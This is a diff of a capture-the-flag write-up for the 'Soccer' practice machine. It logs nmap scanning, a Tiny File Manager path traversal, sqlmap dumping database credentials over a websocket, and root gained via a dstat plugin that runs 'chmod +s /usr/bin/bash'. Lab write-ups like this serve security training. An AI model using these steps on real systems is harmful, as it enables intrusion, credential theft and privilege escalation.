@@ -1,7 +1,24 @@
-Started with 'ping 10.10.11.194 -c 4' to make sure my vpn is up and machine is available.
-'nmap -p- -T4 10.10.11.194' to see which ports are open. Ports 22, 80 and 9091 were open so i scanned them again with 'nmap -sVC -p 22,80,9091 10.10.11.194' 
-for better understanding of versions running in the backend. 
-Added '10.10.11.194 soccer.htb' to my hosts file for website to work.
+Started with 'ping 10.10.11.194 -c 4' to make sure my VPN is up and the machine is available.
+'nmap -p- -T4 10.10.11.194' to see which ports are open. Ports 22, 80, and 9091 were open so I scanned them again with 'nmap -sVC -p 22,80,9091 10.10.11.194' 
+for a better understanding of versions running in the backend. 
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
+80/tcp   open  http            nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+-------SNIP------
+
+Added '10.10.11.194 soccer.htb' to my hosts file for the website to work.
 
 'gobuster dir -u http://soccer.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt' found that there is '/tiny' directory which has a login page.
 It is a Tiny file manager 2.4.3 which is vulnerable to path traversal.
@@ -14,10 +31,10 @@ stty raw -echo && fg
 
 I didn't have access to read 'flag.txt' in player's home folder but I found a 'TODO' file from '/tmp' and saved it for later.
 'find / -name *player* 2>/dev/null' to find more interesting and there seems to be a subdomain.
-Added '10.10.11.194 soc-player.soccer.htb' to '/etc/hosts' for site to work.
-There seems to be a lot more that the main site. Like login page, tickets and match pages.
+Added '10.10.11.194 soc-player.soccer.htb' to '/etc/hosts' for the site to work.
+There seems to be a lot more than the main site. Like login page, tickets, and match pages.
 
-I tried logging in with 'dag@wieers.com' that was in 'TODO' file but didn't get in with most common passwords.
+I tried logging in with 'dag@wieers.com' that was in 'TODO' file but didn't get in with the most common passwords.
 Registered to the site and had a look at the source code. There is a script that connects to websocket at port 9091 that I found in the initial nmap scan.
 
 There was a handy tool 'sqlmap-websocket-proxy' that allows to use sqlmap againts websockets.
@@ -25,9 +42,9 @@ There was a handy tool 'sqlmap-websocket-proxy' that allows to use sqlmap againt
 '/usr/share/sqlmap/sqlmap.py -u http://localhost:8080/?param1=1 --dump-all' to start sqlmap enumeration.
 It found databases 'information_schema, mysql, performance_schema, soccer_db, sys'
 I then continued to use sqlmap to find tables from 'soccer_db' which were '4, email, id, password, username'
-Sqlmap enumerated contents of the tables which took a while.
+Sqlmap enumerated the contents of the tables which took a while.
 
-Ssh in to the box with credentials from the 'soccer_db'
+Ssh into the box with credentials from the 'soccer_db'
 
 I uploaded lse.sh from my pc to target and run it to enumerate faster.
 It found 'permit nopass player as root cmd /usr/bin/dstat' in 'doas.conf' which means I can use 'dstat' as root without a password.
@@ -36,6 +53,6 @@ I then created 'dstat_exp.py' to my pc containing:
 import os
 os.system('chmod +s /usr/bin/bash')
 
-Downloaded it with target machine to one plugin folder I had write to and run 'doas /usr/bin/dstat --exp'
+Downloaded it with the target machine to one plugin folder I had write permission to and run 'doas /usr/bin/dstat --exp'
 It gave few errors but used 'bash -p' and gained root!
 Flag was '/root/root.txt'
